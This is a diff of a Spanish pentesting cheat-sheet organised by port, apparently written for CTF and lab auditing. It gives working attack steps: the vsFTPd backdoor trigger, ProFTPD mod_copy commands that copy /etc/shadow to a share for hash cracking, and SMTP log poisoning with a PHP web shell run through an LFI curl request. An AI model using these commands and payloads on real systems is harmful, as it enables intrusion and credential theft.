@@ -20,25 +20,25 @@ tags:
 
 Sino sabes por donde empezar al momento de encontrarte con uno de estos puertos aqui te enseño algunas cosas que deberias de probar cuando estes auditando.
 
-## 21 FTP (File Transfer Protocol)
+## 21 FTP (File Transfer Protocol).
 Protocolo para la tranferencia remota de archivos.
 Cuando el puerto 21 este abierto puedes intentar conectarte como el usuario anonymous.
 Debes especificar el protocolo seguido de la ip-address víctima. Posteriormente ingresas en el campo username anonnymous y en password lo dejas vacio dando solo enter.
 ```
  ftp <ip-address> -> username: anonymous
- 		     password: 
+ 		     password:
 ```	  
-Estos son algunos de los comandos que puedes utilizar una vez estes conectado al puerto ftp.
-	dir -> Ver los directorios compartidos
-        ls -la -> Listar por archivos ocultos
-        put name_file -> Verificar si se tiene capacidad de escritura y así modificar un archivo de la maquina
-		Ej; put file | put /etc/passwd
-  
-En caso de que se alla detectado la versión vsFTPd 2.3.44 al hacer el escaneo, debes buscar con la herramienta searchsploit un exploit que te permita explotar un backdoor que tiene esa versión que te permiterá ejecutar comandos de forma remota como el enviarte una reverse shell para ganar acceso al sistema. 
-
-Con searchsploit -x unix/remote/49757.py examinas el contenido del exploit para ver como se usa o si tienes que modificar algunos parametros.
-
-Con searchsploit -m unix/remote/49757.py copias el exploit a la ruta actual de trabajo.
+Estos son algunos de los comandos que puedes utilizar una vez estes conectado al puerto ftp.<br>
+- dir -> Ver los directorios compartidos.
+- ls -la -> Listar por archivos ocultos.
+- put <name_file> -> Verificar si se tiene capacidad de escritura y así modificar un archivo de la máquina.
+  * Ej; put file | put /etc/passwd
+<br>  
+En caso de que se alla detectado la versión vsFTPd 2.3.44 al hacer el escaneo, debes buscar con la herramienta searchsploit un exploit que te permita explotar un backdoor que tiene esa versión, y así poder ejecutar comandos de forma remota (RCE) y enviarte una reverse shell para ganar acceso al sistema.
+<br> 
+Con el comando `` searchsploit -x unix/remote/49757.py `` examinas el contenido del exploit para ver como se usa o si tienes que modificar algunos parametros.
+<br>
+Con el comando `` searchsploit -m unix/remote/49757.py `` copias el exploit a la ruta actual de trabajo.
 ```
 searchsploit vsFTPd 2.3.44 -> unix/remote/49757.py -> Backdoor Command Execution
           nc <ip-address> 21 -> USER test:)
@@ -46,29 +46,39 @@ searchsploit vsFTPd 2.3.44 -> unix/remote/49757.py -> Backdoor Command Execution
           ftp <ip-address> -> test:) 
 	  		   -> pass
 ```
-<br>
-En la versión ftp 1.3.5 existe una vulnerabilidad que te permite copiar archivos del sistema (CPFR y CPTO) a una ruta que tenga capacidad de lectura (anonymous) haciendo uso del comando site sin que tengas que autenticarte.
+<br><br>
+En la versión 1.3.5 de FTP existe una vulnerabilidad que te permite copiar archivos del sistema (CPFR y CPTO) a una ruta que tenga capacidad de lectura (anonymous) haciendo uso del comando `` site cpfr `` y `` site cpto `` sin que tengas que llegar a autenticarte al protocola FTP.<br>
+Uso:
 ```
 ftp <ip-address>
 -<><>-OK
 Name: anonymous
-Password: 
+Password:             # Dar enter sin ingresar nada.
 530 Login incorrect.
 Login failed.
-ftp> help	# Con el comando help podras ver los demas comandos que estan disponibles.
+ftp> help	# Con el comando help podras ver los demas comandos que estan disponibles dentro del servicio FTP.
 ftp> site help
 214-The following SITE commands are recognized
 CPFR <sp> pathname 
 CPTO <sp> pathname
 ```
-Para copiar el archivo /etc/shadow a la ruta /home/<username>/share que en este caso es donde se ha montado el recurso compartido el cual tiene capacidad de lectura anonymous. Para replicar esto en otra máquina tendrías que ver la ruta donde está montado el recurso compartido.
+Para copiar un archivo que como ejemplo sería el archivo /etc/shadow a la ruta /home/<username>/share, que en este caso es donde se ha montado el recurso compartido "anonymous" y ademas tiene capacidad de lectura. Para replicar esto en otra máquina tendrías que ver la ruta donde está montado el recurso compartido.
 ```
-site cpfr /etc/shadow	# site cpfr <ruta/a/copiar>
-site cpto /home/JhonDoe/share	# site cpto <ruta/a/donde/se/copiará>
+site cpfr /etc/shadow	                        
+# Es la ruta donde se situa el archivo que quieres copiar.
+
+site cpto /home/<username>/share/<file_name>	
+# Es la ruta a donde se copiará el archivo y <file_name> el nombre con el cual se guardará.
 ```
-Ya solo quedaría listar los recursos compartidos con smbmap y descargar el /etc/shadow para crackear los hashes.
+<br>
+Finalmente lo que tendrías que hacer es listar los recursos compartidos con smbmap y descargar el /etc/shadow para crackear los hashes.
+```
+smbmap -H <ip-address> -r anonymous
+
+smbmap -H <ip-address> --download /anonymous/shadow
+```
 <br><br>
-## 22 SSH (Secure Shell)
+## 22 SSH (Secure Shell).
 Protocolo usado para conectarse de forma remota a un servidor de forma segura.
 
 Existe un exploit que te ayuda a enumerar usuarios existentes en un servidor si la versión esta entre 2.3 < 7.7. 
@@ -82,23 +92,29 @@ python2 45233.py <ip-address>
 ## 25 SMTP (Simple Mail Transfer Protocol).
 Protocolo de red de texto plano utilizado para enviar y recibir correos electrónicos lo que hace que las comunicaciones entre el cliente de correo y el servidor de correo puedan ser legibles para cualquier persona que interprete la comunicación. Para evitar esto se utilizan protocolos de cifrado como STARTTLS o DMARC.<br>
 Cuando un usuario envía un correo electrónico, su cliente de correo (ya sea Outlook o Gmail) utiliza SMTP para enviar el mensaje al servidor de correo destinatario.<br>
-SMTP solo se encarga de enviar correos electrónicos, no los almacena ni los muestra al usuario final, para esto se utilizan los protocolos POP3 y IMAP.<br>
-Puedes conectarte a la máquina usando telnet para enviar un correo electrónico a un usuario válido dentro del sistema el cual contenga código malicioso php y ver si se acontece un log poisoning y ejecutar comandos de forma remota "RCE" (Remote Code Execution), todo esto en caso de que no requiera de autenticación al momento de conectarse.
+SMTP solo se encarga de enviar correos electrónicos, no los almacena ni los muestra al usuario final, para esto se utilizan los protocolos POP3 y IMAP.
+<br>
+Puedes conectarte a la máquina usando telnet para enviar un correo electrónico a un usuario válido dentro del sistema, el cual contenga código malicioso php y ver si se acontece un <b>Log Poisoning</b> y ejecutar comandos de forma remota RCE (Remote Code Execution), todo esto en caso de que no se requiera de autenticación al momento de conectarse con telnet al puerto 25de SMTP.
+Ejemplo:
 ```
 telnet <ip-address> 25
 ```
+<br>
 Una vez conectado, esta sería la estructura básica para enviar un correo por SMTP.
 ```
-MAIL FROM: <username>	# MAIL FROM: es para específicar el remitente del correo.
-RCPT TO: <username>	# RCPT TO: es para indicar el resceptor del correo pero este tipo que ser un usuario válido dentro del sistema.
-DATA			# Poner DATA y luego dar enter para introducir el código.
-<?php system($_GET['cmd']); ?>	# Códido php para aplicar un RCE mediante el parametro cmd.
-.			# Al termino del correo se debe finalizar con un punto.
+MAIL FROM: <username>	
+# MAIL FROM: Es para específicar el remitente del correo.
 
-QUIT			# Cortar la conexión.
+RCPT TO: <username>	
+# RCPT TO: Es para indicar el resceptor del correo pero este tiene que ser un usuario válido dentro del sistema.
+DATA			                      # Poner el comando DATA y luego dar enter para introducir el mensaje del correo.
+<?php system($_GET['cmd']); ?>	# Códido php para aplicar un RCE mediante el parametro cmd.
+.			                          # Al termino del correo se debe finalizar con un punto.
+
+QUIT			                      # Cortar la conexión.
 ```
-Ya solo queda revisar los logs para veríficar que se haya guardado correctamente en la ruta /var/mail/<username>, mediante un LFI (Local File Inclution) o alguna otra vulnerabilidad encontrada (Log poisoning).<br>
-Este sería un ejemplo desde consola usando el comando curl para tramitar la petición.
+Ya solo queda revisar los logs para veríficar que se haya guardado correctamente en la ruta /var/mail/<username>, mediante un LFI (Local File Inclution).<br>
+Este sería un ejemplo desde consola usando el comando curl para tramitar la petición al sitio web y ver los logs.
 ```
 curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"
 
@@ -107,7 +123,7 @@ curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/c
 # -X -> Este parametro es para específicar el método por el cual se tramitará la petición que en este caso se usa el método GET.
 # &cmd=whoami -> Concatenación del parámetro cmd para inyectar el comando whoami y ver si se tiene ejecución remota de comandos "RCE".
 ```
-Para hacer esto desde el sitio web solo basta con poner la url donde se acontece el LFI seguido del parámetro cmd para inyectar los comandos.<br>
+Para ver los logs desde el sitio web solo basta con poner la url donde se acontece el LFI seguido del parámetro cmd para inyectar los comandos.<br>
 http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/<username>&cmd=whoami
 <br><br>
 ## 80 HTTP (Hypertext Transfer Protocol)
